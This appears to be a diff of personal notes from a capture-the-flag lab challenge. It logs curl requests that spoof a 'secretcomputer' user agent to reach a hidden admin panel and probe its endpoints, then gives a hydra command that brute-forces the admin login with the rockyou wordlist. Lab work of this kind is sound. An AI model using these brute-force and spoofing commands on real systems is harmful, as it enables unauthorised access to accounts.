@@ -310,13 +310,14 @@ Hint: Use rockyou.txt when brute forcing for the password (only for the bonus mi
 
 Server: http://10.67.147.80/terminal.php?action=panel
 
-2025-12-24 22:53:23 EST -- 
-curl -i http://10.67.147.80/terminal.php?action=panel
 
-<h2>Access denied</h2><p>This admin panel is terminal-only and is only accessible using secretcomputer</p> 
+2025-12-26 11:21:42 EST -- 
+curl -i http://10.66.175.154/terminal.php?action=panel
 
-2025-12-24 22:55:25 EST -- 
-curl -i -A "secretcomputer" http://10.67.147.80/terminal.php?action=panel
+<h2>Access denied</h2><p>This admin panel is terminal-only and is only accessible using secretcomputer</p>
+
+2025-12-26 11:24:59 EST -- 
+curl -A "secretcomputer" http://10.66.175.154/terminal.php?action=panel
 
 {
     "service": "Wormhole Control Panel",
@@ -330,60 +331,62 @@ curl -i -A "secretcomputer" http://10.67.147.80/terminal.php?action=panel
     "note": "This panel only answers to terminal user agents. Use the endpoints to fully close the wormhole."
 }
 
-2025-12-24 22:57:53 EST -- 
-curl -i -A "secretcomputer" http://10.67.147.80/terminal.php?action=info
+
+// Intial Panel State
+<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
+
+2025-12-26 11:28:33 EST -- 
+curl -A "secretcomputer" http://10.66.175.154/terminal.php?action=info
+
 {
     "title": "Bunny Control Panel",
     "desc": "The rabbits hide the wormhole state and protect closure behind both a session and a token. You will need to authenticate and obtain the operator token."
 }
 
-// Intial
-<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
-
-2025-12-24 22:59:02 EST -- 
-curl -i -A "secretcomputer" http://10.67.147.80/terminal.php?action=login
+2025-12-26 11:29:21 EST -- 
+curl -A "secretcomputer" http://10.66.175.154/terminal.php?action=login
 {
     "error": "POST username & password required."
 }
 
-2025-12-24 22:59:53 EST -- 
-curl -i -A "secretcomputer" http://10.67.147.80/terminal.php?action=pin
+2025-12-26 11:29:56 EST -- 
+curl -A "secretcomputer" http://10.66.175.154/terminal.php?action=pin  
 {
     "error": "POST pin required. ex: curl -X POST -d \"pin=1234\" ..."
 }
 
-2025-12-24 23:00:44 EST -- 
-curl -i -A "secretcomputer" http://10.67.147.80/terminal.php?action=status
+2025-12-26 11:30:31 EST -- 
+curl -A "secretcomputer" http://10.66.175.154/terminal.php?action=status
 {
     "wormhole": "OPEN",
     "note": "Admin information hidden. Authenticate and obtain operator token."
 }
 
-2025-12-24 23:02:04 EST -- 
-curl -i -A "secretcomputer" http://10.67.147.80/terminal.php?action=close
+2025-12-26 11:31:00 EST -- 
+curl -A "secretcomputer" http://10.66.175.154/terminal.php?action=close 
 {
     "error": "POST required to close wormhole."
 }
+ 
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
-## Required Execution Order (Do NOT deviate)
+## Required Execution Order
 login  →  pin  →  token  →  close
 
-// Login Action
+// Login Action (Brute-force /action=login)
 <<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<<
 
-curl -i -A "secretcomputer" -c cookies_bonus.txt "http://10.67.147.80/terminal.php?action=panel"
-
-
-## Test Response
-curl -i -A "secretcomputer" -c cookies_bouns.txt -d "username=admin&password=admin" http://10.67.147.80/terminal.php?action=login
-
+2025-12-26 11:33:11 EST -- 
+## Test a failed response
+curl -A "secretcomputer" -X POST http://10.66.175.154/terminal.php?action=login -d "username=admin&password=letmein"
 {
     "status": "fail",
     "msg": "Invalid credentials."
 }
 
+2025-12-26 12:13:41 EST -- 
+hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.66.175.154 http-post-form "/terminal.php?action=login:username=^USER^&password=^PASS^:F=fail:H=User-Agent\\: secretcomputer" -t 4 -f -V
 
 >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 
